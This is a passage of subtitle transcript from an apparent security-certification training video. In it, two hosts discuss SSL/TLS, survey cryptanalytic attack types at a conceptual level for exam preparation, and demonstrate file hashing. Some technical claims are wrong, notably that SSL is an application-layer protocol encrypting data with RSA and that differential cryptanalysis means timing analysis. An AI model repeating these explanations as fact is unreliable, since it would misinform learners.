cool.\n\n460\n00:22:30.155 --> 00:22:32.635\nSo SSL is an application layer protocol,\n\n461\n00:22:32.635 --> 00:22:36.360\nit's in the OSI model application layer,\nfor message transmissions.\n\n462\n00:22:36.360 --> 00:22:39.340\nJust wanna know, they're kinda old school,\nolder way of doing things.\n\n463\n00:22:39.340 --> 00:22:40.790\nUses the RSA algorithm,\n\n464\n00:22:40.790 --> 00:22:44.030\nwhich is kind of interesting,\nto encrypt the data transmissions.\n\n465\n00:22:44.030 --> 00:22:49.550\nTLS, the successor, if you will,\nto SSL Transport Layer security.\n\n466\n00:22:49.550 --> 00:22:51.830\nWe established secure\nconnections between clients and\n\n467\n00:22:51.830 --> 00:22:55.214\nservers using this also uses RSA.\n\n468\n00:22:55.214 --> 00:23:01.150\nUses RSA with a 1024 [LAUGH] or 2048\nbit implement notations from strength,\n\n469\n00:23:01.150 --> 00:23:05.813\nso wanna know they both use RSA but\nthey implement differently and\n\n470\n00:23:05.813 --> 00:23:09.142\noperate at different\nlayers of the OSI model.\n\n471\n00:23:09.142 --> 00:23:12.608\nAlso important to know,\nwe have the TLS as Mike said,\n\n472\n00:23:12.608 --> 00:23:16.394\nkind of a newer thought process there and\nnot compatible.\n\n473\n00:23:16.394 --> 00:23:20.311\nUnfortunately, which means we have to be\nusing the right protocol on both sides of\n\n474\n00:23:20.311 --> 00:23:23.810\nthat exchange, for us to be able to\ntalk with, which one of the reasons.\n\n475\n00:23:23.810 --> 00:23:26.750\nWe're having trouble pushing TLS and\nimplementing fully right now cuz\n\n476\n00:23:26.750 --> 00:23:30.680\nthere's still so much SSL out there\nthat is kind of getting in the way.\n\n477\n00:23:30.680 --> 00:23:32.730\nSo just wanna think about that and\nbe aware of that.\n\n478\n00:23:32.730 --> 00:23:35.990\nI know we're gonna talk about\nsome attacks against algorithms.\n\n479\n00:23:35.990 --> 00:23:36.935\nWe have a list of attacks,\n\n480\n00:23:36.935 --> 00:23:40.620\nwanna go through with you, ways we\nbreak cryptosystems, so let's go back.\n\n481\n00:23:40.620 --> 00:23:41.690\nLet's just take a look at that.\n\n482\n00:23:41.690 --> 00:23:43.080\nI know we have it up on the screen there.\n\n483\n00:23:44.340 --> 00:23:47.795\nSo let's see,\nwe're opening with--thank you,\n\n484\n00:23:47.795 --> 00:23:51.025\nsir--we're starting with cipher text only.\n\n485\n00:23:51.025 --> 00:23:55.925\nThis is essentially how a bad actor,\nan attacker in our diagram,\n\n486\n00:23:55.925 --> 00:24:00.737\nis gonna operate to try to break\nthe crytposystem At some point,\n\n487\n00:24:00.737 --> 00:24:05.298\nthey're gonna get access to one or\nmore of the moving parts.\n\n488\n00:24:05.298 --> 00:24:07.410\nThey may get the ciphered message.\n\n489\n00:24:07.410 --> 00:24:09.650\nThey may get the unencrypted message.\n\n490\n00:24:09.650 --> 00:24:12.260\nThey may get the knowledge\nof the algorithm.\n\n491\n00:24:12.260 --> 00:24:13.710\nThey may have all three.\n\n492\n00:24:13.710 --> 00:24:16.780\nWhat they're probably not\ngonna have is the key.\n\n493\n00:24:16.780 --> 00:24:20.430\nAnd so the idea is that however\nwe manipulate these moving parts,\n\n494\n00:24:20.430 --> 00:24:24.790\nwhat we're ultimately looking for is to\ncrack the system by guessing the key, and\n\n495\n00:24:24.790 --> 00:24:29.450\nas a result figuring out not just how to\nunencrypt the single message, because in\n\n496\n00:24:29.450 --> 00:24:32.500\nsome of these, you're going to see we\nstart out with the cypher text, right?\n\n497\n00:24:32.500 --> 00:24:35.010\nSo, we may have the encrypted message.\n\n498\n00:24:35.010 --> 00:24:37.850\nIn some we start out with\nthe known plaintext, right?\n\n499\n00:24:37.850 --> 00:24:41.600\nWe actually have the plantext,\nand we have the ciphertext.\n\n500\n00:24:41.600 --> 00:24:43.210\nWe have both sides of the equation.\n\n501\n00:24:43.210 --> 00:24:47.590\nIt's not about a single messages\nconfidentiality protection, or\n\n502\n00:24:47.590 --> 00:24:49.480\na single messages integrity.\n\n503\n00:24:49.480 --> 00:24:50.050\nWhat it is,\n\n504\n00:24:50.050 --> 00:24:54.540\nis about trying to figure out how we are\ngoing to get the key as the back actor.\n\n505\n00:24:54.540 --> 00:24:56.910\nIt's going to open up\nall the messages sent.\n\n506\n00:24:56.910 --> 00:24:58.620\nLet us see everything in the system.\n\n507\n00:24:58.620 --> 00:25:02.240\nBecause the goal is not to encrypt or\ndecrypt one message, the goal is to\n\n508\n00:25:02.240 --> 00:25:08.520\ndecrypt everything from now on, so we can\nsecretly read it without anybody knowing.\n\n509\n00:25:08.520 --> 00:25:10.290\n>> I think your sneeze\nactually fixed the air,\n\n510\n00:25:10.290 --> 00:25:11.760\nbecause all of a sudden\nI'm feeling awesome.\n\n511\n00:25:11.760 --> 00:25:12.510\n>> I do.\nI like that.\n\n512\n00:25:12.510 --> 00:25:14.670\n>> You should sneeze like every\nfive minutes from now on, so\n\n513\n00:25:14.670 --> 00:25:15.635\nit's stays cool in here.\n\n514\n00:25:15.635 --> 00:25:17.810\n>> [LAUGH]\n>> It's taken all that time, and\n\n515\n00:25:17.810 --> 00:25:18.890\nsuddenly the air kicked in..\n\n516\n00:25:18.890 --> 00:25:19.410\n>> All right, anyway.\n\n517\n00:25:19.410 --> 00:25:20.220\nDon't mind us.\n\n518\n00:25:20.220 --> 00:25:23.945\nWe're just sitting here, baking, in\nthe studio to give you some information,\n\n519\n00:25:23.945 --> 00:25:24.960\nbecause it's so hot and humid.\n\n520\n00:25:24.960 --> 00:25:26.280\nAll right, so let's talk about this.\n\n521\n00:25:26.280 --> 00:25:27.280\nSo, keep in mind,\n\n522\n00:25:27.280 --> 00:25:30.010\nit's knowledge of the key that we\nare going to after all these attacks.\n\n523\n00:25:30.010 --> 00:25:31.820\nRight, that's what the attacker wants.\n\n524\n00:25:31.820 --> 00:25:32.960\nSo, Ciphertext only.\n\n525\n00:25:32.960 --> 00:25:34.680\nWe are going to start with the Ciphertext.\n\n526\n00:25:34.680 --> 00:25:39.140\nRemember, Ciphertext is the encrypted\ntext, the output of that system.\n\n527\n00:25:39.140 --> 00:25:41.240\nWe don't have the key or the Plaintext.\n\n528\n00:25:41.240 --> 00:25:44.670\nWe have to attack the Ciphertext,\ntry to decrypt it and\n\n529\n00:25:44.670 --> 00:25:50.390\nwork backwards to figure out, how to get\nthe key that will let us decrypt messages.\n\n530\n00:25:50.390 --> 00:25:53.190\nSo all we have is\nCiphertext in that attack.\n\n531\n00:25:53.190 --> 00:25:54.340\nNo plain text.\n\n532\n00:25:54.340 --> 00:25:57.730\nWe have the plain text, so\nwe have the dog is blue.\n\n533\n00:25:57.730 --> 00:26:03.150\nWe have the Ciphertext version of that ABC\n123, but what we don't have is the key,\n\n534\n00:26:03.150 --> 00:26:06.980\nso we have the encrypted or non-encrypted\nforms of the message, but we still don't\n\n535\n00:26:06.980 --> 00:26:10.340\nhave the key, and now we've got to work\nthose ends to try and figure it out.\n\n536\n00:26:10.340 --> 00:26:12.070\nRemember, knowledge of the algorithm and\n\n537\n00:26:12.070 --> 00:26:15.750\nknowledge of the key are going to be\ncentral to our ability to decrypt.\n\n538\n00:26:15.750 --> 00:26:19.290\nWe may be able to guess\nthe algorithm based on the output.\n\n539\n00:26:19.290 --> 00:26:21.150\nBut we're not going to be\nable to guess the key,\n\n540\n00:26:21.150 --> 00:26:24.990\nunless we get either incredibly lucky, or\nsomebody does something really stupid and\n\n541\n00:26:24.990 --> 00:26:27.840\nessentially exposes the key,\nmore often than not.\n\n542\n00:26:27.840 --> 00:26:29.690\nSo then we have chosen plaintext right?\n\n543\n00:26:29.690 --> 00:26:31.560\nIt's the same as known plaintext,\n\n544\n00:26:31.560 --> 00:26:34.560\nexcept that we get to choose what\nthe plaintext input will be.\n\n545\n00:26:34.560 --> 00:26:39.230\nSo in chosen plaintext, we can manipulate\nthe system by saying, the dog is blue.\n\n546\n00:26:39.230 --> 00:26:41.050\nThe dog is red, the dog is green.\n\n547\n00:26:41.050 --> 00:26:42.330\nAnd we see the output.\n\n548\n00:26:42.330 --> 00:26:44.450\nWe see the ciphertext changing.\n\n549\n00:26:44.450 --> 00:26:46.420\nSo we can look for patterns right?\n\n550\n00:26:46.420 --> 00:26:49.250\n>> Generate patterns or\nforce it to spit out patterns.\n\n551\n00:26:49.250 --> 00:26:50.410\n>> Correct.\nAnd if we, for instance,\n\n552\n00:26:50.410 --> 00:26:52.630\nhave the word the and dog right?\n\n553\n00:26:52.630 --> 00:26:54.880\nIn every one of those the dog is.\n\n554\n00:26:54.880 --> 00:26:58.020\nAnd if we know that, and\nwe see three quarters of that\n\n555\n00:26:58.020 --> 00:27:01.600\ncypher text starts to begin to\nfollow some sort of pattern,\n\n556\n00:27:01.600 --> 00:27:05.650\nwe can begin to zero in on the kind of\nalgorithm it is based on those things.\n\n557\n00:27:05.650 --> 00:27:08.850\nSo, we gotta know that and\nbe aware of that as well.\n\n558\n00:27:08.850 --> 00:27:10.710\nWe've got some more, I think,\ndown below there, right?\n\n559\n00:27:10.710 --> 00:27:14.090\nAll right, chosen ciphertext,\nsame as chosen plaintext.\n\n560\n00:27:14.090 --> 00:27:15.320\nSo we're inverting it.\n\n561\n00:27:15.320 --> 00:27:19.610\nInstead of choosing the plaintext,\nright, we're choosing the ciphertext.\n\n562\n00:27:19.610 --> 00:27:22.975\nSo we've got the outputs,\nwe're gonna manipulate the outputs now,\n\n563\n00:27:22.975 --> 00:27:25.680\nbecause we got a whole bunch of different\nciphertext that we can work with.\n\n564\n00:27:25.680 --> 00:27:28.700\nSo we're just jumping around on\ndifferent sides of the equation here.\n\n565\n00:27:28.700 --> 00:27:32.860\nDifferential cryptanalysis\nlooks at differences in\n\n566\n00:27:32.860 --> 00:27:36.565\nwhich the keys are being implemented and\nused to do the encryption.\n\n567\n00:27:36.565 --> 00:27:39.440\n>> Mm-hm.\n>> So, you, if we have the ability to look\n\n568\n00:27:39.440 --> 00:27:43.470\nat the encryption cycle, and\nto be able to look at execution,\n\n569\n00:27:43.470 --> 00:27:48.070\nwe could begin to look at timing, we could\nlook at implementation, how long does it\n\n570\n00:27:48.070 --> 00:27:52.890\ntake a computer to implement that\nparticular cryptographic process.\n\n571\n00:27:52.890 --> 00:27:56.770\nThen we can say, that algorithm\ntends to take that long to run,\n\n572\n00:27:56.770 --> 00:28:01.410\nand we can begin to zero in on some of\nthe tell tale signs of what that may be.\n\n573\n00:28:01.410 --> 00:28:05.510\nLinear Cryptanalysis looks at\nthe functions that are being used, and\n\n574\n00:28:05.510 --> 00:28:06.920\nwhat results they may yield.\n\n575\n00:28:06.920 --> 00:28:12.415\nSo we're actually looking at the internal\nworkings of that particular algorithm.\n\n576\n00:28:12.415 --> 00:28:15.595\nTrying to examine the algorithm now and\nseeing what's going on with it.\n\n577\n00:28:15.595 --> 00:28:17.235\nThe mathematics behind it.\n\n578\n00:28:17.235 --> 00:28:18.345\nThings like that.\n\n579\n00:28:18.345 --> 00:28:20.035\nWe may look at side channel attacks.\n\n580\n00:28:20.035 --> 00:28:21.310\nTrying to break encryption.\n\n581\n00:28:21.310 --> 00:28:25.070\nBy looking at the crypto system itself,\nthings like power levels,\n\n582\n00:28:25.070 --> 00:28:28.210\nelectromagnetic emanations or\ninterference.\n\n583\n00:28:28.210 --> 00:28:32.520\nSo we're looking at the actual execution\nfrom a physical perspective and\n\n584\n00:28:32.520 --> 00:28:34.480\nlooking at tell tale signs there.\n\n585\n00:28:34.480 --> 00:28:36.730\nHow much power does it essentially take?\n\n586\n00:28:36.730 --> 00:28:39.130\nHow long, as I said,\ndoes it take to execute?\n\n587\n00:28:39.130 --> 00:28:42.860\nWhat kind of strain does\nit put on the processors?\n\n588\n00:28:42.860 --> 00:28:46.640\nAll that kind of stuff can tell us about\nwhat kind of encryption algorithm,\n\n589\n00:28:46.640 --> 00:28:48.935\nand how strongly implemented it is.\n\n590\n00:28:48.935 --> 00:28:52.850\nSo, there will be also be telltale signs,\nreplay attacks essentially allows\n\n591\n00:28:52.850 --> 00:28:56.670\nus to essentially capture something,\nsend it back through the system again,\n\n592\n00:28:56.670 --> 00:28:59.930\ntrying to figure out wether or\nnot we can generate the same response, or\n\n593\n00:28:59.930 --> 00:29:03.120\ndifferent responses,\nhas the key been changed?\n\n594\n00:29:03.120 --> 00:29:05.110\nThose kind of things we're looking at.\n\n595\n00:29:05.110 --> 00:29:07.100\nMan in the middle attack,\n\n596\n00:29:07.100 --> 00:29:12.110\nwe can implement a situation where\nessentially we catch the transmission.\n\n597\n00:29:12.110 --> 00:29:14.570\nWe try to modify it, and\nthen send it through.\n\n598\n00:29:14.570 --> 00:29:18.670\nControlling it and trying to see how we\ncan manipulate it, and what that may be.\n\n599\n00:29:18.670 --> 00:29:21.730\nAlgebraic attacks look at\nthe algorithms themselves.\n\n600\n00:29:21.730 --> 00:29:24.320\nAre there vulnerabilities\nin the implementation?\n\n601\n00:29:24.320 --> 00:29:29.550\nSo are there vulnerabilities\nin the the problem,\n\n602\n00:29:29.550 --> 00:29:33.450\nthe mathematical formulas that are set\nup to actually use the algorithm?\n\n603\n00:29:33.450 --> 00:29:36.130\nSo, for instance, when we look at WEP,\nand we have talked\n\n604\n00:29:36.130 --> 00:29:40.330\nabout WEP in regards to the wireless\ndiscussions, we had in those episodes.\n\n605\n00:29:40.330 --> 00:29:42.580\nWe also shed a little light\non the weakness of WEP, and\n\n606\n00:29:42.580 --> 00:29:47.450\nhow WEP was implemented, and the fact that\nthe RC4 algorithm, strong algorithm but\n\n607\n00:29:47.450 --> 00:29:50.650\nwas implemented poorly, and\nso it was subjected to,\n\n608\n00:29:50.650 --> 00:29:55.950\nessentially, an analysis that showed that\nthe algebraic implementation was off.\n\n609\n00:29:55.950 --> 00:29:56.750\n>> Right.\n>> And because of that,\n\n610\n00:29:56.750 --> 00:29:59.630\nwe may be able to attack it,\nand indeed, we were able to.\n\n611\n00:29:59.630 --> 00:30:02.880\nAnalytical attacks, the structure of\nthe algorithm, how is it implemented?\n\n612\n00:30:02.880 --> 00:30:05.180\nThese are all variations on a theme,\nright?\n\n613\n00:30:05.180 --> 00:30:08.150\nStatistical, identify\nstatistical weaknesses.\n\n614\n00:30:08.150 --> 00:30:09.880\nSo we may be able to get in there.\n\n615\n00:30:09.880 --> 00:30:12.280\nLook at patterns that repeat.\n\n616\n00:30:12.280 --> 00:30:15.370\nIf we've run it long enough,\ndo we see repetitive patterns?\n\n617\n00:30:15.370 --> 00:30:19.300\nThat was ultimately what did WEP right or\ndid RC4 in through WEP, so\n\n618\n00:30:19.300 --> 00:30:20.650\nwe have to think about that.\n\n619\n00:30:20.650 --> 00:30:23.850\nSocial engineering, can we trick\nsomeone into giving us the keys?\n\n620\n00:30:23.850 --> 00:30:26.148\nPotentially, however we do that.\n\n621\n00:30:26.148 --> 00:30:29.780\nAnd the Meet-in-the-Middle,\nwe attack from both sides.\n\n622\n00:30:29.780 --> 00:30:33.510\nWe call that an attack that has both\nplaintext and ciphertext elements.\n\n623\n00:30:33.510 --> 00:30:36.020\nAnd so some of those attacks\nwhere we have both plaintext and\n\n624\n00:30:36.020 --> 00:30:37.790\nciphertext are called\nMeet-in-the-Middle attacks.\n\n625\n00:30:37.790 --> 00:30:40.650\nSo we've got a whole bunch of\nthese that we can go through.\n\n626\n00:30:40.650 --> 00:30:42.760\nAnd we can interact with the news.\n\n627\n00:30:42.760 --> 00:30:46.810\nAgain, knowledge of these attacks very\nimportant for you regards to the exam.\n\n628\n00:30:46.810 --> 00:30:48.720\nWant to make sure we're\nfamiliar with them.\n\n629\n00:30:48.720 --> 00:30:52.960\nCannot talk about them, just understand\nsome of the things that may go on there.\n\n630\n00:30:52.960 --> 00:30:57.950\nIn other words, how can we break\na crypto system, if given a problem or\n\n631\n00:30:57.950 --> 00:31:01.590\ngiven an explanation of what's going on,\nwhich kind kind of attack are we using\n\n632\n00:31:01.590 --> 00:31:05.360\nis a good way to think about that, or\nif we're given some information, hey,\n\n633\n00:31:05.360 --> 00:31:07.940\nwe know this and this,\nwhat would be the best attack?\n\n634\n00:31:07.940 --> 00:31:10.520\nChoosing that best attack out of\nthe list would also be a good way to\n\n635\n00:31:10.520 --> 00:31:12.100\nthink about that, right?\n\n636\n00:31:12.100 --> 00:31:15.300\nSo, we've talked a lot about encryption,\nand we've talked about the different ways\n\n637\n00:31:15.300 --> 00:31:20.780\nwe can encrypted out of, talking about\ndigital signatures, you can use hashing to\n\n638\n00:31:20.780 --> 00:31:26.410\nderive an attack, or excuse me,\nhow we can prevent an attack on\n\n639\n00:31:26.410 --> 00:31:30.370\nour integrity in terms of knowing that\nthe data That has not been compromised.\n\n640\n00:31:30.370 --> 00:31:33.670\nWe'll talk about proof of origin and\nnon-repudiation with hashing.\n\n641\n00:31:33.670 --> 00:31:35.890\nDo we have the ability\nto do a quick hash demo?\n\n642\n00:31:35.890 --> 00:31:37.770\n>> We do.\n>> Up there before we take off?\n\n643\n00:31:37.770 --> 00:31:39.720\n>> Sure.\n>> So we're gonna just remind you what\n\n644\n00:31:39.720 --> 00:31:43.460\nhashing looks like one more time,\njust so we can do that little piece and\n\n645\n00:31:43.460 --> 00:31:46.500\nthen we'll go in and\nwe're gonna do a separate conversation.\n\n646\n00:31:46.500 --> 00:31:50.090\nReal quick lab, we'll do that as\na separate episode where we can talk about\n\n647\n00:31:50.090 --> 00:31:53.490\nencryption tools and drive encryption\na little bit so we'll take a look at that.\n\n648\n00:31:53.490 --> 00:31:55.440\n>> Soon as I get Mac\nhash to fire up again.\n\n649\n00:31:55.440 --> 00:31:55.950\n>> Okay no problem.\n\n650\n00:31:55.950 --> 00:31:56.580\n>> Just getting it on there.\n\n651\n00:31:56.580 --> 00:31:58.490\n>> So we're gonna give Mike just a second.\n\n652\n00:31:58.490 --> 00:31:59.500\nHe's gonna help us set that up.\n\n653\n00:31:59.500 --> 00:32:01.329\n>> There we go.\n>> And remember the idea with hashing is\n\n654\n00:32:01.329 --> 00:32:04.684\nthe ability to be able to take some\nsort of variable input, run it through\n\n655\n00:32:04.684 --> 00:32:08.539\na hashing algorithm We're gonna use a tool\nto do that Michael demonstrated a tool.\n\n656\n00:32:08.539 --> 00:32:10.840\nAnd then we're gonna get a fixed output.\n\n657\n00:32:10.840 --> 00:32:14.670\nSo we're gonna let you drive the demo\nhere, tell us what you're doing.\n\n658\n00:32:14.670 --> 00:32:16.910\n>> In this particular, and\nthere are several of them out there,\n\n659\n00:32:16.910 --> 00:32:20.690\nthis is Mac Hash, I've got\nthe option to put in text or hext.\n\n660\n00:32:20.690 --> 00:32:21.917\n>> Text or hext.\n\n661\n00:32:21.917 --> 00:32:23.780\n>> Text or hext I like it, right?\n\n662\n00:32:23.780 --> 00:32:26.650\nWe're back to your Doctor Seuss there.\n\n663\n00:32:26.650 --> 00:32:27.579\n>> Yep.\n>> So, let's take a look.\n\n664\n00:32:27.579 --> 00:32:30.474\nI've got a file here, just called\nHello World, if I open this file up,\n\n665\n00:32:30.474 --> 00:32:32.570\nit's got some simple text in there,\nHello world!\n\n666\n00:32:32.570 --> 00:32:34.130\nAnd an exclamation point.\n\n667\n00:32:34.130 --> 00:32:37.770\nIf I go into my Mac Hash and\nchoose that file,\n\n668\n00:32:37.770 --> 00:32:43.560\nwe'll jump over to my desktop grab\nthat file, open it up, and then I\n\n669\n00:32:43.560 --> 00:32:48.100\nhave the ability to choose what algorithm\nI want to use, what hashing algorithm.\n\n670\n00:32:48.100 --> 00:32:50.752\nLet's do a couple, let's do MD5,\nwe'll do SHA-1, or\n\n671\n00:32:50.752 --> 00:32:55.730\nS-H-A-1 and maybe Checksum and\nthen I'll click Calculate.\n\n672\n00:32:55.730 --> 00:32:57.660\nIt's gonna run that document.\n\n673\n00:32:57.660 --> 00:33:00.530\nThrough those algorithms,\nif I can zoom in here.\n\n674\n00:33:00.530 --> 00:33:05.300\nYou can see that fixed link output that\nAdam's been talking about that MD5 puts\n\n675\n00:33:05.300 --> 00:33:10.480\nout, SHA1, a little bit longer output\nthere, Checksum, a little bit shorter.\n\n676\n00:33:10.480 --> 00:33:16.270\nAnd the idea is I can click calculate on\nthat file over and over and over again.\n\n677\n00:33:16.270 --> 00:33:19.290\nIts always gonna generate that\nsame value because the document\n\n678\n00:33:19.290 --> 00:33:23.000\nhasn't changed its gonna give us that\nintegrity that we're looking for.\n\n679\n00:33:23.000 --> 00:33:24.470\nWhat i'm gonna do,\nis I'm gonna click this.\n\n680\n00:33:24.470 --> 00:33:28.550\nIn this particular program,\nI'm gonna click memory which is gonna\n\n681\n00:33:28.550 --> 00:33:32.274\nput those values,\nits gonna memorize those values.\n\n682\n00:33:32.274 --> 00:33:32.820\n>> That's cool.\n\n683\n00:33:32.820 --> 00:33:33.953\n>> So we're gonna click Memory.\n\n684\n00:33:33.953 --> 00:33:36.129\nI'm gonna go back to that document, and\n\n685\n00:33:36.129 --> 00:33:40.130\nI'm just gonna add a single\nI could add a bunch of text.\n\n686\n00:33:40.130 --> 00:33:41.570\nI could change the words.\n\n687\n00:33:41.570 --> 00:33:45.355\nI could put a new space in there,\neven a white space would change this.\n\n688\n00:33:45.355 --> 00:33:50.135\nI'll save that document, close it,\nand then I'm just gonna pick that\n\n689\n00:33:50.135 --> 00:33:52.835\nfile again just to make sure it\nknows that it's been updated.\n\n690\n00:33:52.835 --> 00:33:56.525\nSo we can see it, I'll click Open, and\nthen I'm gonna click Calculate, when I do,\n\n691\n00:33:56.525 --> 00:34:01.807\nif you watch these values,\nyou'll see that they change.\n\n692\n00:34:01.807 --> 00:34:03.407\n>> Ooh, that's magic.\n\n693\n00:34:03.407 --> 00:34:04.417\n>> It is.\n\n694\n00:34:04.417 --> 00:34:09.117\nAnd if I do compare,\nI'll see that those values\n\n695\n00:34:09.117 --> 00:34:13.077\ndo not match the values I\nhad it memorize earlier.\n\n696\n00:34:13.077 --> 00:34:15.337\n>> So that's the value of using the Mac,\nright?\n\n697\n00:34:15.337 --> 00:34:17.421\nIs if you get the cool little thumbs up,\nthumbs down.\n\n698\n00:34:17.421 --> 00:34:18.294\n>> You do.\nThey even like to make it basic.\n\n699\n00:34:18.294 --> 00:34:19.619\n>> Cause in Windows we don't have that.\n\n700\n00:34:19.619 --> 00:34:20.915\nIt just-\n>> [LAUGH]\n\n701\n00:34:20.915 --> 00:34:21.911\n>> It shows us that and\n\n702\n00:34:21.911 --> 00:34:23.490\nassumes we'll know.\n\n703\n00:34:23.490 --> 00:34:27.260\nAs opposed to having to be told which\nreinforces my thought process that it is\n\n704\n00:34:27.260 --> 00:34:30.430\na consumer product for children as\nopposed to a computer for adults.\n\n705\n00:34:30.430 --> 00:34:32.115\nBut that's beside the point totally.\n\n706\n00:34:32.115 --> 00:34:32.940\n>> [LAUGH]\n>> All right.\n\n707\n00:34:32.940 --> 00:34:34.380\nSo that's actually a really cool demo.\n\n708\n00:34:34.380 --> 00:34:38.030\nSo it shows us that there is no match,\nand thumbs down indicates visually,\n\n709\n00:34:38.030 --> 00:34:41.300\nbut we obviously could see it\nwent from BB whatever to AC or\n\n710\n00:34:41.300 --> 00:34:44.910\nwhatever that starting string was that\nthe hash actually does not match.\n\n711\n00:34:44.910 --> 00:34:45.650\nOutputs are different.\n\n712\n00:34:45.650 --> 00:34:47.420\n>> Exactly right.\n>> That is very cool.\n\n713\n00:34:47.420 --> 00:34:49.600\nVery cool, I say twice,\nvery cool, very cool.\n\n714\n00:34:49.600 --> 00:34:50.690\n>> It is.\n[LAUGH] It was that cool.\n\n715\n00:34:50.690 --> 00:34:52.480\n>> It was so cool we had to say it twice.\n\n716\n00:34:52.480 --> 00:34:54.185\nCuz the first time you may not\nhave been paying attention.\n\n717\n00:34:54.185 --> 00:34:56.670\n>> [LAUGH]\n>> Hello out there.\n\n718\n00:34:56.670 --> 00:34:57.470\nHello, viewer.\n\n719\n00:34:57.470 --> 00:34:58.280\nWake up.\n\n720\n00:34:58.280 --> 00:34:59.300\nAll right, so,\n\n721\n00:34:59.300 --> 00:35:02.690\njust a couple of quick cryptographic\nattack notes that we left out.\n\n722\n00:35:02.690 --> 00:35:03.310\nWe did not mention.\n\n723\n00:35:03.310 --> 00:35:05.980\nJust want to mention a couple\nthat I forgot to throw in there.\n\n724\n00:35:05.980 --> 00:35:07.820\nI mentioned the rubber hose\nattack before we got into it but\n\n725\n00:35:07.820 --> 00:35:09.030\nI still need to define it.\n\n726\n00:35:09.030 --> 00:35:10.550\n>> Right.\n>> So rubber hose attack is where we\n\n727\n00:35:10.550 --> 00:35:14.505\nactually potentially, it's a form,\nlike an aggressive form we'll call it.\n\n728\n00:35:14.505 --> 00:35:15.940\n>> [LAUGH]\n>> Of social engineering.\n\n729\n00:35:15.940 --> 00:35:17.890\nWe take social engineering\nto the next level.\n\n730\n00:35:17.890 --> 00:35:20.985\nWe don't try to trick you,\nwe just try to beat it out of you.\n\n731\n00:35:20.985 --> 00:35:23.615\n>> [LAUGH]\n>> So our rubber hose attacks, essentially\n\n732\n00:35:23.615 --> 00:35:27.962\nwe're torturing or coercing you at\nthe point of a gun to give us the key, so\n\n733\n00:35:27.962 --> 00:35:29.802\njust know that can't happen.\n\n734\n00:35:29.802 --> 00:35:34.329\nAlso, timing attacks were talked about,\nbut we didn't call them out specifically,\n\n735\n00:35:34.329 --> 00:35:38.546\nwhere we look at some of the internal\nworkings of the system, and specifically,\n\n736\n00:35:38.546 --> 00:35:40.050\nwe look at execution times.\n\n737\n00:35:40.050 --> 00:35:43.065\nI hinted at that and referenced that\nwith a couple of those attacks, but\n\n738\n00:35:43.065 --> 00:35:44.735\nit didn't call them out as a category.\n\n739\n00:35:44.735 --> 00:35:46.908\nWe specifically call\nthem the timing attacks,\n\n740\n00:35:46.908 --> 00:35:50.470\nI just wanted to make sure you're\nfamiliar with that thought process.\n\n741\n00:35:50.470 --> 00:35:54.360\nAlso I don't believe,\nI know we did cypher text only.\n\n742\n00:35:54.360 --> 00:35:56.530\nI know we did chosen plain text,\nknown plain text.\n\n743\n00:35:56.530 --> 00:35:59.020\nI don't think we called\nthat adaptive plain text.\n\n744\n00:35:59.020 --> 00:35:59.750\n>> No, we did not.\n\n745\n00:35:59.750 --> 00:36:00.820\n>> We have that one.\n\n746\n00:36:00.820 --> 00:36:02.150\nAgain, we kind of hinted at it.\n\n747\n00:36:02.150 --> 00:36:03.950\nWe didn't call it out specifically.\n\n748\n00:36:03.950 --> 00:36:05.700\nJust reminding you of this as well.\n\n749\n00:36:05.700 --> 00:36:07.340\nAdaptive, chosen plain text.\n\n750\n00:36:07.340 --> 00:36:10.260\nAdaptive anything it's really\njust a matter of and we said,\n\n751\n00:36:10.260 --> 00:36:12.210\nwe can iterate through and\nrun it multiple times.\n\n752\n00:36:12.210 --> 00:36:14.890\nChanging the input or\nthe output as we do that.\n\n753\n00:36:14.890 --> 00:36:17.190\nWe call that an adaptive attack.\n\n754\n00:36:17.190 --> 00:36:20.320\nIn this case adaptive shows in plain\ntext would be the way to go there.\n\n755\n00:36:20.320 --> 00:36:22.000\nSo, just keep that in mind.\n\n756\n00:36:22.000 --> 00:36:23.170\nAnd then the oldie but the goodie.\n\n757\n00:36:23.170 --> 00:36:24.140\nThe standard.\n\n758\n00:36:24.140 --> 00:36:25.740\nIt's so common we didn't even mention it.\n\n759\n00:36:25.740 --> 00:36:26.690\nShame on us.\n\n760\n00:36:26.690 --> 00:36:27.540\nReally, shame on you.\n\n761\n00:36:27.540 --> 00:36:28.700\nBut shame on us.\n\n762\n00:36:28.700 --> 00:36:30.910\nBrute force attacks which we\nalso didn't put on the list and\n\n763\n00:36:30.910 --> 00:36:33.060\nwe forgot to mention but are important.\n\n764\n00:36:33.060 --> 00:36:33.870\nBrute force attacks.\n\n765\n00:36:33.870 --> 00:36:37.210\nWhere we're just guessing the key by just\nthrowing everything out one at a time\n\n766\n00:36:37.210 --> 00:36:40.100\nuntil we actually either\nget the right combination.\n\n767\n00:36:40.100 --> 00:36:43.942\nWe luckily, we're able to guess the key,\nor we run out of time because we die at\n\n768\n00:36:43.942 --> 00:36:46.750\nthe keyboard trying to do\nthat It takes forever, right?\n\n769\n00:36:46.750 --> 00:36:48.750\n>> Like we talked about\nthat with keyspaces.\n\n770\n00:36:48.750 --> 00:36:51.010\nThat's the big advantage\nof that larger keyspace.\n\n771\n00:36:51.010 --> 00:36:51.545\n>> We did.\n\n772\n00:36:51.545 --> 00:36:56.320\n>> Is I run out of time, or\nif it's a small keyspace I might\n\n773\n00:36:56.320 --> 00:37:00.370\nvery well be able to go through every\npossibility, and eventually get that key.\n\n774\n00:37:00.370 --> 00:37:03.480\n>> You're right, if there's a small\nenough number of keys, then, and\n\n775\n00:37:03.480 --> 00:37:04.310\nwe actually described it.\n\n776\n00:37:04.310 --> 00:37:07.130\nAnd we said, like If we had five keys\nat one point what would it take?\n\n777\n00:37:07.130 --> 00:37:09.210\nRight and you looked at me laughed and\nsaid like 30 seconds.\n\n778\n00:37:09.210 --> 00:37:10.816\n>> Yeah.\n>> And I said what about five million?\n\n779\n00:37:10.816 --> 00:37:13.680\nYou looked at me and said I'd be\ndead before it actually occured.\n\n780\n00:37:13.680 --> 00:37:15.910\nSo that's the kind of thing we're\nthinking about with brute force attacks.\n\n781\n00:37:15.910 --> 00:37:17.580\nJust wanted to throw those\ninto the mix at the end just\n\n782\n00:37:17.580 --> 00:37:19.110\nto make sure that we didn't forget them.\n\n783\n00:37:19.110 --> 00:37:21.170\nThey're obviously all important for\n\n784\n00:37:21.170 --> 00:37:25.300\nexam preparation, wanna add those in, make\nsure you know about those as well, and\n\n785\n00:37:25.300 --> 00:37:29.860\nthen you'll be, hopefully all prepared\nwhen you see those questions, okay?\n\n786\n00:37:29.860 --> 00:37:32.410\n>> All right, sounds good Adam,\nwe appreciate 